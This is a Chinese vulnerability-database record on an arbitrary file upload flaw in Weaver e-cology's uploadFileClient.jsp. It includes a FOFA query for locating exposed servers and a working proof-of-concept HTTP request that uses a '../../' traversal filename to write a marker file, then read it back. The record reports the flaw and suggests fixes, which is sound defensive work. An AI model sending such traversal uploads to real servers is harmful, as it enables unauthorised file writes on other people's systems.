---
source: "https://github.com/TD0U/WeaverScan/blob/5360245b20d5a6425c7684d104bf5fa7001d74fc/vulners/Wc9.go"
title: "泛微e-cology uploadFileClient.jsp上传路径约束失效"
product: "泛微e-cology"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本补丁未知；服务可写目录"
prerequisites: "无Cookie公开样本，正文已明确认证需核"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEE-Cology%20UploadFileClient%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"泛微-协同办公OA\""
id: "vw-1781663c3172ee9e043aa61f"
entity_id: "ve-1781663c3172ee9e043aa61f"
schema_version: "1"
source_url: "https://github.com/TD0U/WeaverScan/blob/5360245b20d5a6425c7684d104bf5fa7001d74fc/vulners/Wc9.go"
---

# 泛微e-cology uploadFileClient.jsp上传路径约束失效

## 条目说明

- 对象与具体问题：泛微e-cology；uploadFileClient.jsp上传路径约束失效
- 版本、配置及部署条件：版本补丁未知；服务可写目录
- 认证与权限前提：无Cookie公开样本，正文已明确认证需核
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 条目正确区分文本写入/回读与JSP执行，不夸大RCE；固定commit来源可追溯
- 说明上游Exploit上传名与访问名不符并选取一致扫描函数，质量明显优于泛化转载
- 剩余缺口：最低受影响版本/修复补丁、真实认证边界；无本地验证

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

### 漏洞描述

泛微 E-Cology 的集群升级上传接口接收客户端提供的文件名。公开验证代码在 `upload` 文件字段的 `filename` 中使用相对路径，将文本文件写到升级目录后回读；这一流程用于验证上传路径约束失效。

### 影响范围与前提

产品：泛微 E-Cology。具体受影响版本与补丁范围未知。上游扫描函数未携带登录 Cookie；部署中的认证及网关限制仍需独立确认。上传目标需处于服务进程可写范围，文本回读并不证明 JSP 可执行。

### 公开验证资料

以下是 `Wc09scancore` 的文本验证流程，标记沿用上游。它会写文件，只适合隔离且允许写入的验证环境。

```http
POST /clusterupgrade/uploadFileClient.jsp HTTP/1.1
Host: oa.example.com
Content-Type: multipart/form-data; boundary=VulWikiBoundary

--VulWikiBoundary
Content-Disposition: form-data; name="upload"; filename="../../clusterupgrade/a7.txt"
Content-Type: image/jpeg

helloword
--VulWikiBoundary--
```

随后回读同一路径：

```http
GET /clusterupgrade/a7.txt HTTP/1.1
Host: oa.example.com
```

确认前应核对该文件事先不存在，回读内容确为本次提交的标记，并清理本次产生的文件。单次上传响应或已有同名文件不能证明漏洞。上游 `Exploit` 函数的上传名与访问名并不一致，本文仅采用路径一致的扫描函数，不保留其命令执行结论。

### 修复建议

向厂商核对当前版本和对应安全更新；在修复前限制该接口的访问，并检查相关访问日志。

### 参考来源

- [公开资料 1](https://github.com/TD0U/WeaverScan/blob/5360245b20d5a6425c7684d104bf5fa7001d74fc/vulners/Wc9.go)

来源已于 2026-10-02 静态核对；本文未在目标环境执行请求，公开 PoC 不代表本地复现通过。
